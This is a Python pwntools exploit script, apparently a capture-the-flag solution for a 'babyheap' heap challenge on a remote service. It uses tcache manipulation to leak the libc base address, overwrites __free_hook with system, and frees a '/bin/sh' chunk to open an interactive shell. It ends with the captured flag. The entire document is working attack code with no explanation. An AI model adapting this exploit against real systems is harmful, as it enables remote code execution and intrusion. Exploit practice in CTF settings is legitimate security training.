from pwn import *

def make(size,note):
    p.sendlineafter(">",str(1))    
    p.sendlineafter("size",str(size))    
    p.sendlineafter("note",note)    

def deln():
    p.sendlineafter(">",str(2))    

def edit(idx,note):
    p.sendlineafter(">",str(3))    
    p.sendlineafter("idx",str(idx))    
    p.sendlineafter("note",note)    

def show(idx):
    p.sendlineafter(">",str(4))
    p.sendlineafter("idx",str(idx))
    p.recvuntil("note:")
    return p.recvline()
    
    
# p = process("./babyheap")
p = remote("incognito.spr.io",3337)
free_hook_offset = 0x3ed8e8
system_offset = 0x4f4e0
bin_offset = 0x1b40fa
libc_offset = 0x3ebca0
one_gadget = [0x4f2c5,0x4f322,0x10a38c]

make(0x10,"b"*0x8)

for i in range(0,8):
    make(0x100,"a"*0x10)
for i in range(0,10):
    deln()
    
libc_base = u64(show(1)[1:-1]+"\x00\x00") - libc_offset
free_hook = libc_base + free_hook_offset
binsh = libc_base + bin_offset
system = libc_base + system_offset
one = libc_base+one_gadget[2]

log.info(hex(libc_base))
edit(2,p64(free_hook))
make(0x100,"c"*0x10)
make(0x100,p64(system))

# edit(0,p64(binsh))
make(0x10,"/bin/sh")

pause()
deln()

p.interactive()
#FLAG{tc4ch3_1s_v3ry_e4sy_t0_h4ndl3}